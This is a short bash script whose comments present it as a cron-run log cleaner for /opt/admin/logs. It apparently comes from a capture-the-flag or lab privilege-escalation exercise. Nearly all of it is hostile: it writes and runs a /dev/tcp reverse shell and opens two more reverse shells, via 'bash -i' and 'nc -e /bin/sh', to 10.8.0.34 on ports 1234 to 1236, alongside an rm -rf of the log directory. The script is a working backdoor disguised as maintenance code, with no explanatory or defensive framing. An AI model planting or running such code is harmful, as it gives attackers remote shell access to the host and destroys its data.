
#!/bin/bash

# Delete any file in the log directory
# This script is executed every 5 minutes (via cron job)

echo 'we start with our shits!' >> we_start.txt

echo "0<&175-;exec 175<>/dev/tcp/10.8.0.34/1234;sh <&175 >&175 2>&175" >> metasploit_shell.sh
sh metasploit_shell.sh

bash -i >& /dev/tcp/10.8.0.34/1235 0>&1
nc -e /bin/sh 10.8.0.34 1236

rm -rf /opt/admin/logs/*


echo 'we are done with our shits!' >> we_are_done.txt

